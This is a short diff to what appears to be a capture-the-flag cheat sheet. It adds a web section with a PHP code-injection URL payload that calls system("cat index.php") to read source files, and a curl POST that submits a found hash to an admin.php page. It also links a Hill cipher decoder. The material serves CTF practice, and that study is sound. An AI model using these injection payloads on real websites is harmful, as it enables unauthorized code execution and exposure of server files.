@@ -45,6 +45,10 @@
 
 
 ## Web <a name="web"></a>
+- ```http://127.0.0.1:808/index.php?page=' and die(system("cat index.php")) or ' ```
+  - if you want to read the index.php use this payload in the url "    ' and die(system("cat index.php")) or ' "
+- ```curl -X POST --data hash=2196812e91c29df34f5e217cfd639881 "http://example.com:8080/admin.php"```
+  - you use this if you found hash in the sorce page
 
 ## Cryptography <a name="crypto"></a>
 1. This is [Hill Cipher](https://www.dcode.fr/hill-cipher), see how it works or use an online decoder
